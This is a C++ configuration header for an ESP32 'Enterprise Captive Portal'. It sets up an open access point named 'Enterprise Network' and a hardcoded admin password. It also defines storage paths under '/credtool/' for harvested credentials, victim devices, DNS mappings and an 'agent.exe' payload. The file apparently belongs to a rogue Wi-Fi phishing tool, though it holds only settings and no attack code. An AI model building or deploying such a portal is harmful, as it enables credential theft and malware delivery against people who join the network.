/*
 * ============================================================================
 *  ESP32 Enterprise Captive Portal - Configuration
 *  Version: 2.0.0
 * ============================================================================
 */

#ifndef CONFIG_H
#define CONFIG_H

#include <IPAddress.h>

namespace Config {
    // Access Point Settings
    const char* AP_SSID = "Enterprise Network";
    const char* AP_PASSWORD = "";  // Empty = Open network
    const IPAddress AP_IP(10, 22, 4, 1);
    const IPAddress AP_GATEWAY(10, 22, 4, 1);
    const IPAddress AP_SUBNET(255, 255, 255, 0);
    
    // Admin Settings
    const char* ADMIN_PASSWORD = "Khaled@WiC2";
    const unsigned long SESSION_TIMEOUT_MS = 30 * 60 * 1000;  // 30 minutes
    
    // File Paths
    const char* DEVICES_FILE = "/credtool/devices.json";
    const char* CREDS_FILE = "/credtool/credentials.json";
    const char* AGENT_FILE = "/credtool/agent.exe";
    const char* CLIENTS_FILE = "/credtool/clients.json";
    
    // Limits
    const size_t MAX_DEVICES = 100;
    const size_t MAX_CREDENTIALS = 100;
    const size_t MAX_CLIENTS = 50;
    const size_t JSON_DOC_SIZE = 16384;
    
    // DNS Settings
    const byte DNS_PORT = 53;
    
    // Advanced Settings Files
    const char* DNS_MAPPINGS_FILE = "/credtool/dns_mappings.json";
    const char* SETTINGS_FILE = "/credtool/settings.json";
    
    // Limits for new features
    const size_t MAX_DNS_MAPPINGS = 50;
    const size_t MAX_WIFI_SCAN_RESULTS = 20;
}

// Device Types
enum class DeviceType : uint8_t {
    WINDOWS = 0,
    IPHONE = 1,
    ANDROID = 2,
    MAC = 3,
    LINUX = 4,
    UNKNOWN = 255
};

inline const char* deviceTypeToString(DeviceType type) {
    switch (type) {
        case DeviceType::WINDOWS: return "Windows";
        case DeviceType::IPHONE:  return "iPhone/iPad";
        case DeviceType::ANDROID: return "Android";
        case DeviceType::MAC:     return "macOS";
        case DeviceType::LINUX:   return "Linux";
        default:                  return "Unknown";
    }
}

inline const char* deviceTypeIcon(DeviceType type) {
    switch (type) {
        case DeviceType::WINDOWS: return "💻";
        case DeviceType::IPHONE:  return "📱";
        case DeviceType::ANDROID: return "📱";
        case DeviceType::MAC:     return "🖥️";
        case DeviceType::LINUX:   return "🐧";
        default:                  return "❓";
    }
}

#endif
